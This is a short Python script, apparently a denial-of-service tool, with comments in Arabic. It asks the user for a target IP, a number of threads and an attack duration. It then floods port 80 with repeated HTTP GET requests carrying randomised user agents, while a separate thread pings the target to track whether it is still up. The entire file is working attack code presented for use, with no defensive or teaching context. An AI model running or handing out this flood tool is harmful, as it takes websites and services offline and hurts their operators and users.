import os
import platform
import subprocess
import socket
import time
import random
import threading
from colorama import Fore, init

init()

def UAlist():
    return [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Podcasts/1650.20 CFNetwork/1333.0.4 Darwin/21.5.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
        "AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; nl_nl)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "bbos",
        "urmom",
        "xd",
        "null"
    ]

def ping(target_ip):
    while True:
        if platform.system().lower() == "windows":
            response = subprocess.Popen(["ping", "-n", "1", target_ip], stdout=subprocess.PIPE).stdout.read()
        else:
            response = subprocess.Popen(["ping", "-c", "1", target_ip], stdout=subprocess.PIPE).stdout.read()

        response = response.decode("utf-8")
        if "TTL" in response:  # التأكد من وجود رد من العنوان المستهدف
            print(f"{Fore.GREEN}Ping is good - {response.strip()}")  # عرض رسالة البنق إذا كانت جيدة
        else:
            print(f"{Fore.RED}Ping failed - {response.strip()}")  # عرض رسالة عدم الوصول إذا كانت البنق غير جيدة

        time.sleep(1)  # تكرار العملية كل ثانية

def http(ip, floodtime):
    while time.time() < floodtime:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.connect((ip, 80))
                while time.time() < floodtime:
                    sock.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(UAlist())}\r\nConnection: keep-alive\r\n\r\n'.encode())
            except:
                sock.close()

def attack(ip, port, threads, duration):
    end_time = time.time() + duration
    for _ in range(threads):
        threading.Thread(target=http, args=(ip, end_time)).start()

def main():
    ip = input("Target IP: ")
    port = 80  # يمكنك تغيير البورت حسب الحاجة
    threads = int(input("Threads: "))
    duration = int(input("Attack Time (seconds): "))

    print(f"Launching HTTP flood attack on {ip} for {duration} seconds with {threads} threads...")
    # إضافة وتشغيل خيط لعملية الـ ping
    ping_thread = threading.Thread(target=ping, args=(ip,))
    ping_thread.start()
    attack(ip, port, threads, duration)

if __name__ == "__main__":
    main()